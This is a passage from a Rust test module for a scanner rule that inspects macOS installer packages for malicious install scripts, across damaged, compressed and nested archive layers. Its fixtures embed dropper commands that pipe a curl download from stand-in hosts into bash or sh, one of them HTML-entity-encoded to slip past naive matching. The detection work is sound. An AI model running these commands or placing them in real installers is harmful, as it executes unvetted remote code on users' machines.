            .expect("the decoded preinstall scores");
        assert!(
            signal.description.contains("install script preinstall"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));

        // Intact, the same entry reads complete.
        let c = ctx("s.pkg", &pkg_with_scripts(full));
        assert!(InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .is_some());
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    /// A wrong block CRC does not hide the decoded bytes: libxar yields them
    /// without checking, so they are scanned and the entry reported unreadable.
    #[test]
    fn a_bzip2_distribution_with_a_wrong_crc_is_scanned_and_marked_incomplete() {
        let mut blob = include_bytes!("../../testdata/bzip2/distribution_dropper.in").to_vec();
        blob[10] ^= 0x80; // block CRC
        let c = ctx("bad.pkg", &bzip2_distribution_pkg(&blob));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded block scores");
        assert!(signal.description.starts_with("distribution script:"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// Asserts `pkg` scores as a dropper Distribution, is marked incomplete
    /// and scans as Partial with that signal.
    fn assert_scored_but_partial(pkg: &[u8]) {
        let c = ctx("d.pkg", pkg);
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded bytes score");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
        assert!(
            signal
                .description
                .contains("launches an interpreter (bash)"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));

        let c = ctx("d.pkg", pkg);
        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
        let r = crate::scan::scan_context(&c, &rules);
        assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
        assert_eq!(r.signals.len(), 1);
    }

    /// Valid stream, but over the entry budget: the in-budget prefix holds the dropper.
    #[test]
    fn a_bzip2_distribution_over_budget_is_scanned_and_marked_incomplete() {
        let blob = include_bytes!("../../testdata/bzip2/distribution_big.in");
        assert_scored_but_partial(&bzip2_distribution_pkg(blob));
    }

    /// Valid CRCs and no trailer, then a tail that breaks the XML: the raw
    /// text is scanned.
    #[test]
    fn a_trailerless_bzip2_distribution_with_a_junk_tail_is_scanned() {
        let full = include_bytes!("../../testdata/bzip2/distribution_junk_tail.in");
        let cut = crate::bzip2::cut_trailer(full);
        assert_scored_but_partial(&bzip2_distribution_pkg(cut));
    }

    #[test]
    fn a_wrong_crc_trailerless_bzip2_distribution_is_scanned() {
        let full = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
        let mut cut = crate::bzip2::cut_trailer(full).to_vec();
        cut[10] ^= 0x01;
        assert_scored_but_partial(&bzip2_distribution_pkg(&cut));
    }

    /// The benign counterpart of the junk-tail case: nothing to report.
    #[test]
    fn a_trailerless_benign_distribution_with_a_junk_tail_is_not_applicable() {
        let full = include_bytes!("../../testdata/bzip2/distribution_ordinary_junk_tail.in");
        let cut = crate::bzip2::cut_trailer(full);
        let c = ctx("d.pkg", &bzip2_distribution_pkg(cut));
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    /// Scores `dist` (stored, so fully read) as a dropper that is unparseable
    /// but still reported: signal with both indicators, marked incomplete.
    fn assert_fallback_scores(dist: &[u8]) {
        let c = ctx("f.pkg", &pkg_with_distribution(dist));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the fallback scores");
        assert!(
            signal
                .description
                .contains("launches an interpreter (bash)"),
            "{}",
            signal.description
        );
        assert!(
            signal.description.contains("download piped to a shell"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// Entity-encoded dropper in an attribute, cut off, with an XML-breaking
    /// tail: the raw text shows `&#99;url`, only the decoded form matches.
    #[test]
    fn an_entity_encoded_dropper_behind_a_junk_tail_is_scored() {
        let full = include_bytes!("../../testdata/bzip2/distribution_entity_junk_tail.in");
        let cut = crate::bzip2::cut_trailer(full);
        let c = ctx("e.pkg", &bzip2_distribution_pkg(cut));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded form scores");
        assert!(signal.description.contains("download piped to a shell"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn an_entity_encoded_script_behind_a_junk_tail_is_scored() {
        let mut dist = br#"<a><script>system.run(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&#99;url -fsSL https://example-cdn.invalid/a.sh | /bin/bash&quot;);</script></a>"#.to_vec();
        dist.extend_from_slice(&[b'\n'; 50]);
        dist.extend_from_slice(&[b'<'; 300]);
        assert_fallback_scores(&dist);
    }

    #[test]
    fn an_unterminated_script_holding_a_dropper_is_scored() {
        assert_fallback_scores(
            br#"<a><script>system.run("/bin/bash", "-c", "curl -fsSL https://example-cdn.invalid/a.sh | /bin/bash");"#,
        );
    }

    /// The false-positive side: an unparseable but ordinary Distribution
    /// stays NotApplicable, with no signal.
    #[test]
    fn an_unparseable_benign_distribution_is_not_applicable() {
        let body = "<title>Example App</title><script>function onConclusion() { system.run('unload.sh'); }</script>\
                    <readme file=\"r.html\"/>";
        for dist in [
            format!(r#"<?xml version="1.0" encoding="macintosh"?><i>{body}</i>"#),
            format!(r#"<!DOCTYPE i [<!ENTITY t "Example">]><i>{body}</i>"#),
        ] {
            let c = ctx("b.pkg", &pkg_with_distribution(dist.as_bytes()));
            assert!(
                matches!(
                    InstallerScriptRule.evaluate(&c),
                    Err(RuleOutcome::NotApplicable)
                ),
                "{dist}"
            );
        }
    }

    #[test]
    fn utf16_declarations_are_accepted_on_real_utf16() {
        for (decl, big_endian, bom) in [
            ("UTF-16", false, true),
            ("UTF-16LE", false, false),
            ("UTF-16BE", true, false),
            ("UTF-16", true, true),
        ] {
            let doc = format!(
                r#"<?xml version="1.0" encoding="{decl}"?><a><script>system.run("/bin/bash", "-c", "x");</script></a>"#
            );
            let out = distribution_js(&utf16(&doc, big_endian, bom)).expect(decl);
            let out = String::from_utf8_lossy(&out);
            assert!(out.contains(r#"system.run("/bin/bash""#), "{decl}: {out}");
        }
    }

    /// ASCII declaration, then UTF-16 content: libxml2 switches decoder at the declaration.
    fn mixed_utf16_docs() -> Vec<Vec<u8>> {
        let rest = r#"?><i><script>system.run("/bin/bash","-c","curl -fsSL https://example.invalid/a.sh | /bin/bash");</script></i>"#;
        [("UTF-16LE", false), ("UTF-16BE", true)]
            .into_iter()
            .map(|(decl, big_endian)| {
                let mut doc = format!(r#"<?xml version="1.0" encoding="{decl}""#).into_bytes();
                doc.extend(utf16(rest, big_endian, false));
                doc
            })
            .collect()
    }

    #[test]
    fn utf16_content_behind_an_8bit_declaration_is_not_applicable() {
        for doc in mixed_utf16_docs() {
            assert!(not_applicable(&doc));
        }
        assert!(not_applicable(b"<a>\0</a>"));
    }

    #[test]
    fn utf16_content_behind_an_8bit_declaration_is_scanned_and_marked_incomplete() {
        for doc in mixed_utf16_docs() {
            let c = ctx("m.pkg", &pkg_with_distribution(&doc));
            let signal = InstallerScriptRule
                .evaluate(&c)
                .expect("evaluates")
                .expect("the NUL-stripped text scores");
            assert!(
                signal
                    .description
                    .contains("system.run launches an interpreter (bash)"),
                "{}",
                signal.description
            );
            assert!(c.marked_incomplete("installer-script-suspicious"));
        }
    }

    /// A stored `Scripts` entry that is not cpio.
    fn pkg_with_scripts(blob: &[u8]) -> Vec<u8> {
        let toc = format!(
            r#"<file id="1"><name>Scripts</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/octet-stream"/></data></file>"#,
            n = blob.len()
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(blob);
        bytes
    }

    /// A complete zlib stream of stored blocks holding `inner`.
    fn zlib_stored(inner: &[u8]) -> Vec<u8> {
        let mut chunks: Vec<&[u8]> = inner.chunks(u16::MAX as usize).collect();
        if chunks.is_empty() {
            chunks.push(&[]);
        }
        let mut v = vec![0x78, 0x01];
        for (i, chunk) in chunks.iter().enumerate() {
            let n = u16::try_from(chunk.len()).expect("chunked");
            v.push(u8::from(i + 1 == chunks.len()));
            v.extend_from_slice(&n.to_le_bytes());
            v.extend_from_slice(&(!n).to_le_bytes());
            v.extend_from_slice(chunk);
        }
        v.extend_from_slice(&crate::inflate::adler32(inner).to_be_bytes());
        v
    }

    /// `Scripts` that is zlib on the heap and gzip-wrapped cpio inside: a
    /// cut-short inner gzip is scanned and reported incomplete (#75).
    #[test]
    fn a_damaged_inner_gzip_scripts_stream_scores_and_marks_incomplete() {
        let full = include_bytes!("../../testdata/gzip/scripts_dropper.in");
        let c = ctx(
            "s.pkg",
            &pkg_with_scripts(&zlib_stored(&full[..full.len() - 8])),
        );
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded preinstall scores");
        assert!(
            signal.description.contains("install script preinstall"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));

        // Intact inner gzip reads complete.
        let c = ctx("s.pkg", &pkg_with_scripts(&zlib_stored(full)));
        assert!(InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .is_some());
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    /// A stored `Scripts` gzip cut inside the DEFLATE body: the last
    /// member's body is short, its decoded part is still scanned (#75).
    #[test]
    fn a_scripts_gzip_cut_mid_stream_scans_the_cut_short_member() {
        let full = include_bytes!("../../testdata/gzip/scripts_dropper_long.in");
        let plain = include_bytes!("../../testdata/gzip/scripts_dropper_long.out");
        let cut = &full[..full.len() - 8 - 100];

        let (prefix, err) = crate::inflate::gzip_decompress_partial(cut, 1 << 20);
        assert!(err.is_err());
        assert!(prefix.len() < plain.len());
        assert!(prefix.windows(4).any(|w| w == b"curl"));

        let c = ctx("s.pkg", &pkg_with_scripts(cut));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded prefix scores");
        assert!(
            signal
                .description
                .contains("install script preinstall (cut short)"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// One odc cpio member (regular file, mode 0644).
    fn odc_member(name: &str, body: &[u8]) -> Vec<u8> {
        odc_member_mode(name, body, 0o100644)
    }

    /// One odc cpio member with the given mode.
    fn odc_member_mode(name: &str, body: &[u8], mode: u32) -> Vec<u8> {
        let mut v = format!(
            "070707{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:011o}{:06o}{:011o}",
            0,
            0,
            mode,
            0,
            0,
            1,
            0,
            0,
            name.len() + 1,
            body.len()
        )
        .into_bytes();
        v.extend_from_slice(name.as_bytes());
        v.push(0);
        v.extend_from_slice(body);
        v
    }

    /// A walk halted by the entry limit scans only the members it parsed, and
    /// is reported: real `Scripts` have a handful of members (#123).
    #[test]
    fn members_past_the_entry_limit_are_not_scanned() {
        let mut cpio = Vec::new();
        for i in 0..cpio::CpioLimits::default().max_entries {
            cpio.extend(odc_member(&format!("f{i}"), b"echo hi\n"));
        }
        cpio.extend(odc_member(
            "late",
            b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
        ));

        let c = ctx("s.pkg", &pkg_with_scripts(&cpio));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the limit is reported");
        assert_eq!(signal.description, format!("{STARVED} (1 component)"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A gzip header, one decoded byte, then an invalid DEFLATE symbol,
    /// followed by plaintext: the raw bytes are scanned as well (#75).
    #[test]
    fn a_failing_inner_gzip_still_scans_the_raw_bytes() {
        let mut blob = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
        // Fixed-Huffman block: literal 'a', then the invalid symbol 286.
        blob.extend_from_slice(&[0x4b, 0x1c, 0x03]);
        blob.extend_from_slice(
            b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
        );

        let (v, r) = crate::inflate::gzip_decompress_partial(&blob, 1 << 20);
        assert_eq!(v, b"a");
        assert!(matches!(r, Err(crate::decode::DecodeError::Malformed)));

        // Zlib on the heap, so the gzip is read by the rule, not the xar layer.
        let c = ctx("s.pkg", &pkg_with_scripts(&zlib_stored(&blob)));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the raw bytes score");
        assert!(
            signal.description.contains("install scripts (unparsed)"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A complete gzip member of one stored block holding `inner`.
    fn gzip_member(inner: &[u8]) -> Vec<u8> {
        let n = u16::try_from(inner.len()).expect("one stored block");
        let mut v = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3, 1];
        v.extend_from_slice(&n.to_le_bytes());
        v.extend_from_slice(&(!n).to_le_bytes());
        v.extend_from_slice(inner);
        v.extend_from_slice(&crate::inflate::crc32(inner).to_le_bytes());
        v.extend_from_slice(&(inner.len() as u32).to_le_bytes());
        v
    }

    /// A complete odc cpio archive of one regular file.
    fn cpio_one(name: &str, body: &[u8]) -> Vec<u8> {
        let mut v = odc_member(name, body);
        v.extend(odc_member("TRAILER!!!", b""));
        v
    }

    const SCRIPT_DROPPER: &[u8] =
        b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n";

    /// `gzip(benign preinstall) ‖ later`, stored and zlib on the heap.
    fn later_member_pkgs(later: &[u8]) -> [Vec<u8>; 2] {
        let mut blob = gzip_member(&cpio_one("preinstall", b"echo hi\n"));
        blob.extend_from_slice(later);
        [
            pkg_with_scripts(&blob),
            pkg_with_scripts(&zlib_stored(&blob)),
        ]
    }

    /// Installer runs only the first member (#109); a later one is still
    /// scanned, and is not a reason to report the entry unreadable.
    #[test]
    fn a_later_gzip_member_is_scanned_without_marking_incomplete() {
        let mut later = gzip_member(&cpio_one("postinstall", SCRIPT_DROPPER));
        later.extend(gzip_member(&cpio_one("other", b"echo hi\n")));
        for pkg in later_member_pkgs(&later) {
            let c = ctx("s.pkg", &pkg);
            let signal = InstallerScriptRule
                .evaluate(&c)
                .expect("evaluates")
                .expect("the later member scores");
            assert!(
                signal.description.contains(
                    "install script postinstall (later gzip member, not run by Installer)"
                ),
                "{}",
                signal.description
            );
            assert!(!c.marked_incomplete("installer-script-suspicious"));
        }
    }

    /// A pkg whose first `Scripts` member is `member`, beside an `exit 0`
    /// preinstall (and a dropper postinstall if `dropper`).
    fn pkg_with_script_member(member: (&str, &[u8]), dropper: bool) -> Vec<u8> {
        let mut cpio = odc_member("preinstall", b"exit 0\n");
        if dropper {
            cpio.extend(odc_member("postinstall", SCRIPT_DROPPER));
        }
        cpio.extend(odc_member(member.0, member.1));
        cpio.extend(odc_member("TRAILER!!!", b""));
        pkg_with_scripts(&gzip_member(&cpio))
    }

    /// A UDIF image: `koly` trailer 512 bytes from the end.
    fn udif() -> Vec<u8> {
        let mut dmg = vec![0u8; 2048];
        dmg[1536..1540].copy_from_slice(b"koly");
        dmg
    }

    /// A ZIP of an LZMA member, which the reader cannot decode.
    fn unreadable_zip() -> Vec<u8> {
        use crate::zip::tests_support::{plain, Spec};
        let mut lzma = Spec::stored("a.bin", b"lzma");
        lzma.method = 14;
        lzma.local_method = 14;
        plain(&[lzma])
    }

    /// Scans `pkg` with only the script rule.
    fn scan_script_rule(pkg: &[u8]) -> crate::model::ScanCompleteness {
        let c = ctx("d.pkg", pkg);
        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
        crate::scan::scan_context(&c, &rules).completeness
    }

    /// A disk image in `Scripts` is a gap, not a clean read (§6.2, §11.8, #86).
    #[test]
    fn a_disk_image_in_scripts_is_not_applicable_and_partial() {
        let pkg = pkg_with_script_member(("payload.dmg", &udif()), false);
        let c = ctx("d.pkg", &pkg);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        assert_eq!(
            scan_script_rule(&pkg),
            crate::model::ScanCompleteness::Partial
        );
    }

    /// A finding outranks the gap, and the gap is still reported.
    #[test]
    fn a_disk_image_beside_a_script_finding_marks_incomplete() {
        let pkg = pkg_with_script_member(("payload.dmg", &udif()), true);
        let c = ctx("d.pkg", &pkg);
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the dropper scores");
        assert!(signal.description.contains("postinstall"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A ZIP read in full inside `Scripts` stays a clean read.
    #[test]
    fn a_readable_zip_in_scripts_stays_complete() {
        use crate::zip::tests_support::{plain, Spec};
        let zip = plain(&[Spec::stored("readme.txt", b"hello")]);
        let pkg = pkg_with_script_member(("data.zip", &zip), false);
        let c = ctx("d.pkg", &pkg);
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
        assert_eq!(
            scan_script_rule(&pkg),
            crate::model::ScanCompleteness::Complete
        );
    }

    /// A dropper inside a readable ZIP in `Scripts` is scored, not dropped.
    #[test]
    fn a_dropper_in_a_zip_in_scripts_scores() {
        use crate::zip::tests_support::{plain, Spec};
        let zip = plain(&[Spec::stored("run.sh", SCRIPT_DROPPER)]);
        let pkg = pkg_with_script_member(("data.zip", &zip), false);
        let c = ctx("d.pkg", &pkg);
        let sig = InstallerScriptRule.evaluate(&c).unwrap().unwrap();
        assert!(sig.description.contains("run.sh"), "{}", sig.description);
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    /// A package inside `Scripts` is not inspected, so it is a gap.
    #[test]
    fn a_package_in_scripts_is_partial() {
        let inner = pkg_with_scripts(&gzip_member(&cpio_one("preinstall", b"exit 0\n")));
        let pkg = pkg_with_script_member(("inner.pkg", &inner), false);
        assert_eq!(
            scan_script_rule(&pkg),
            crate::model::ScanCompleteness::Partial
        );
    }

    /// A ZIP the reader cannot decode in full inside `Scripts` is a gap.
    #[test]
    fn an_uninspectable_zip_in_scripts_is_partial() {
        let pkg = pkg_with_script_member(("data.zip", &unreadable_zip()), false);
        let c = ctx("d.pkg", &pkg);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        assert_eq!(
            scan_script_rule(&pkg),
            crate::model::ScanCompleteness::Partial
        );
    }

    /// Installer never runs later gzip members (#109): an image there is not
    /// a gap, like any other content of theirs.
    #[test]
    fn a_disk_image_in_a_later_gzip_member_is_not_a_gap() {
        let later = gzip_member(&cpio_one("payload.dmg", &udif()));
        for pkg in later_member_pkgs(&later) {
            let c = ctx("s.pkg", &pkg);
            assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
        }
    }

    /// Neither is an unreadable ZIP or a package in a later gzip member.
    #[test]
    fn a_zip_and_a_package_in_a_later_gzip_member_are_not_gaps() {
        let inner = pkg_with_scripts(&gzip_member(&cpio_one("preinstall", b"exit 0\n")));
        let mut cpio = odc_member("data.zip", &unreadable_zip());
        cpio.extend(odc_member("inner.pkg", &inner));
        cpio.extend(odc_member("TRAILER!!!", b""));
        for pkg in later_member_pkgs(&gzip_member(&cpio)) {
            let c = ctx("s.pkg", &pkg);
            assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
        }
    }

    /// A small stored zip, `n.zip`'s `readme.txt`.
    fn small_zip() -> Vec<u8> {
        use crate::zip::tests_support::{plain, Spec};
        plain(&[Spec::stored("readme.txt", b"hello")])
    }

    /// What reading [`small_zip`] charges.
    fn small_zip_cost() -> usize {
        crate::zip::read(&small_zip(), &ZipLimits::default(), &mut |_| {}).spent
    }

    /// Gzipped cpio of `n` copies of [`small_zip`], all named `preinstall`
    /// (exempt from the scan total) beside an `exit 0` one.
    fn many_zips_scripts(n: usize) -> Vec<u8> {
        let mut cpio = odc_member("postinstall", b"exit 0\n");
        for _ in 0..n {
            cpio.extend(odc_member("preinstall", &small_zip()));
        }
        cpio.extend(odc_member("TRAILER!!!", b""));
        gzip_member(&cpio)
    }

    /// Evaluates `pkg` with a ZIP allowance of `zip_bytes`; returns the result
    /// and what the zips spent.
    fn evaluate_zips(
        pkg: &[u8],
        zip_bytes: usize,
    ) -> (Result<Option<MatchedSignal>, RuleOutcome>, usize) {
        let limits = ZipLimits {
            max_read_back_bytes: zip_bytes,
            ..ZipLimits::default()
        };
        let mut zips = ZipAllowance::new(&limits);
        let c = ctx("z.pkg", pkg);
        let r = InstallerScriptRule.evaluate_limited(&c, &xar::XarLimits::default(), &mut zips);
        (r, zip_bytes - zips.left)
    }

    /// All the ZIPs in one package's `Scripts` entries draw from one
    /// allowance; past it a zip is a gap, never a clean read (§6.2, §11.12).
    #[test]
    fn zips_in_scripts_share_one_allowance() {
        let cost = small_zip_cost();
        assert!(cost > 0);
        let one = pkg_with_scripts(&many_zips_scripts(10));
        let several = components_archive(&vec![many_zips_scripts(4); 3], true);
        for (pkg, zips) in [(one, 10), (several, 12)] {
            let (r, spent) = evaluate_zips(&pkg, zips * cost);
            assert!(matches!(r, Ok(None)), "{r:?}");
            assert_eq!(spent, zips * cost);
            // Room for three and a half: the rest are budget gaps.
            let bound = 3 * cost + cost / 2;
            let (r, spent) = evaluate_zips(&pkg, bound);
            assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
            assert!(spent <= bound, "{spent} > {bound}");
            // None left: no zip is read, and not reread at default limits.
            let (r, spent) = evaluate_zips(&pkg, 0);
            assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
            assert_eq!(spent, 0);
        }
    }

    /// A stored zip's script is scored through its member only, as the same
    /// script is bare, not again in the zip's raw bytes.
    #[test]
    fn a_script_in_a_stored_zip_in_scripts_scores_once() {
        use crate::zip::tests_support::{plain, Spec};
        let weight = |member: (&str, &[u8])| {
            let pkg = pkg_with_script_member(member, false);
            let sig = InstallerScriptRule.evaluate(&ctx("d.pkg", &pkg));
            sig.unwrap().expect("scores")
        };
        let zip = plain(&[Spec::stored("run.sh", SCRIPT_DROPPER)]);
        let zipped = weight(("data.zip", &zip));
        let bare = weight(("run.sh", SCRIPT_DROPPER));
        assert!(bare.weight < MAX_SCRIPT_WEIGHT);
        assert_eq!(zipped.weight, bare.weight);
        assert_eq!(zipped.description.matches("install script").count(), 1);
        assert!(
            zipped
                .description
                .starts_with("install script data.zip: run.sh: "),
            "{}",
            zipped.description
        );
    }

    /// A dropper script with a zip appended (self-extracting) is still
    /// scanned as text, not only through the zip's members.
    #[test]
    fn a_script_with_a_zip_appended_is_scanned_as_text() {
        use crate::zip::tests_support::{plain, Spec};
        let mut sfx = SCRIPT_DROPPER.to_vec();
        sfx.extend(plain(&[Spec::stored("readme.txt", b"hello")]));
        let pkg = pkg_with_script_member(("postinstall", &sfx), false);
        let sig = InstallerScriptRule.evaluate(&ctx("d.pkg", &pkg));
        let sig = sig.unwrap().expect("the script text scores");
        assert!(sig.description.contains("install script postinstall"));
    }

    /// A `Scripts` gzip whose content is a ZIP, not cpio, is scored through
    /// its members and is still not a full read.
    #[test]
    fn a_zip_in_place_of_the_scripts_cpio_scores_its_members() {
        use crate::zip::tests_support::{plain, Spec};
        let zip = plain(&[Spec::stored("run.sh", SCRIPT_DROPPER)]);
        let pkg = pkg_with_scripts(&gzip_member(&zip));
        let c = ctx("d.pkg", &pkg);
        let sig = InstallerScriptRule.evaluate(&c).unwrap().expect("scores");
        assert!(
            sig.description
                .starts_with("install scripts (unparsed): run.sh: "),
            "{}",
            sig.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// The members after the first are joined, as `gunzip` joins them, so a
    /// cpio split across two of them is read whole.
    #[test]
    fn later_gzip_members_are_joined_before_cpio_parsing() {
        let cpio = cpio_one("postinstall", SCRIPT_DROPPER);
        let (a, b) = cpio.split_at(40);
        let mut later = gzip_member(a);
        later.extend(gzip_member(b));
        for pkg in later_member_pkgs(&later) {
            let c = ctx("s.pkg", &pkg);
            let signal = InstallerScriptRule.evaluate(&c).expect("evaluates");
            assert!(signal
                .expect("scores")
                .description
                .contains("install script postinstall (later gzip member"));
        }
    }

    /// A damaged, non-cpio or non-gzip tail is evidence only: scanned as far
    /// as it goes, never `Partial` (#109).
    #[test]
    fn a_damaged_later_member_is_scanned_but_not_incomplete() {
        let cut = |v: Vec<u8>| v[..v.len() - 8].to_vec();
        let benign = cpio_one("postinstall", b"echo hi\n");
        for later in [
            cut(gzip_member(&benign)),
            gzip_member(b"plain text, not cpio\n"),
            b"trailing junk".to_vec(),
        ] {
            for pkg in later_member_pkgs(&later) {
                let c = ctx("s.pkg", &pkg);
                assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
            }
        }

        let dropper = cpio_one("postinstall", SCRIPT_DROPPER);
        for (later, note) in [
            (cut(gzip_member(&dropper)), "(later gzip member"),
            (
                gzip_member(SCRIPT_DROPPER),
                "install scripts (later gzip member, unparsed)",
            ),
        ] {
            for pkg in later_member_pkgs(&later) {
                let c = ctx("s.pkg", &pkg);
                let signal = InstallerScriptRule
                    .evaluate(&c)
                    .expect("evaluates")
                    .expect("scores");
                assert!(signal.description.contains(note), "{}", signal.description);
                assert!(!c.marked_incomplete("installer-script-suspicious"));
            }
        }
    }

    #[test]
    fn unparsable_scripts_with_a_dropper_are_scored_and_marked_incomplete() {
        let blob = b"#!/bin/sh\ncurl -fsSL http://198.51.100.5/s | sh\n";
        let c = ctx("s.pkg", &pkg_with_scripts(blob));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the raw text scores");
        assert!(
            signal
                .description
                .starts_with("install scripts (unparsed):"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn unparsable_scripts_with_nothing_scoring_are_not_applicable() {
        let c = ctx(
            "s.pkg",
            &pkg_with_scripts(b"not a gzip or cpio archive at all"),
        );
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    /// Undecodable bytes with nothing scoring are unreadable, not clean.
    #[test]
    fn an_undecodable_bzip2_distribution_is_not_applicable() {
        let c = ctx(
            "bad.pkg",
            &bzip2_distribution_pkg(b"BZh91AY&SY\x01\x02\x03\x04 junk"),
        );
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    /// A product-style xar with a readable dropper `Distribution` and a
    /// `Scripts` entry whose bytes are not a cpio archive, in either TOC order.
    fn dropper_with_garbage_scripts(scripts_first: bool) -> Vec<u8> {
        let dist = br#"<a><script>system.run("/bin/bash", "-c", "curl -fsSL https://example-cdn.invalid/a.sh | /bin/bash");</script></a>"#;
        let garbage = b"not a gzip or cpio archive at all";
        let entry = |id: u32, name: &str, off: usize, len: usize| {
            format!(
                r#"<file id="{id}"><name>{name}</name><type>file</type><data><offset>{off}</offset><length>{len}</length><size>{len}</size><encoding style="application/octet-stream"/></data></file>"#
            )
        };
        let (d_off, s_off) = if scripts_first {
            (garbage.len(), 0)
        } else {
            (0, dist.len())
        };
        let d = entry(1, "Distribution", d_off, dist.len());
        let s = entry(2, "Scripts", s_off, garbage.len());
        let toc = if scripts_first { s + &d } else { d + &s };
        let mut bytes = xar::toc_xar_bytes(&toc);
        if scripts_first {
            bytes.extend_from_slice(garbage);
            bytes.extend_from_slice(dist);
        } else {
            bytes.extend_from_slice(dist);
            bytes.extend_from_slice(garbage);
        }
        bytes
    }

    #[test]
    fn a_finding_survives_an_unreadable_sibling_entry_and_marks_incomplete() {
        for scripts_first in [false, true] {
            let c = ctx("p.pkg", &dropper_with_garbage_scripts(scripts_first));
            let signal = InstallerScriptRule
                .evaluate(&c)
                .expect("evaluates")
                .expect("the readable Distribution still scores");
            assert!(
                signal.description.starts_with("distribution script:"),
                "{}",
                signal.description
            );
            assert!(c.marked_incomplete("installer-script-suspicious"));

            let c = ctx("p.pkg", &dropper_with_garbage_scripts(scripts_first));
            let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
            let r = crate::scan::scan_context(&c, &rules);
            assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
            assert_eq!(r.signals.len(), 1);
        }
    }

    /// A product-style xar whose only entry is a stored `Distribution`.
    fn pkg_with_distribution(dist: &[u8]) -> Vec<u8> {
        let toc = format!(
            r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/octet-stream"/></data></file>"#,
            n = dist.len()
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(dist);
        bytes
    }

    /// Under 256 bytes, so only the script-extension path makes it "text"
    /// for the name markers.
    #[test]
    fn a_short_distribution_script_is_scored_as_script_text() {
        let dist = br#"<a><script>system.run("/usr/bin/osascript", "-e", "x");</script></a>"#;
        assert!(dist.len() < 256);
        let c = ctx("short.pkg", &pkg_with_distribution(dist));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("fires");
        assert!(
            signal.description.contains("references osascript"),
            "{}",
            signal.description
        );
    }

    #[test]
    fn a_clean_read_does_not_mark_incomplete() {
        let c = ctx("d.pkg", pkg!("distribution_dropper"));
        let _ = InstallerScriptRule.evaluate(&c);
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn non_packages_are_not_this_rules_concern() {
        for (name, body) in [
            ("notes.txt", b"just some text".as_slice()),
            ("script.sh", b"#!/bin/sh\ncurl http://x | sh\n".as_slice()),
            ("empty", b"".as_slice()),
        ] {
            assert!(
                matches!(InstallerScriptRule.evaluate(&ctx(name, body)), Ok(None)),
                "{name}"
            );
            assert!(
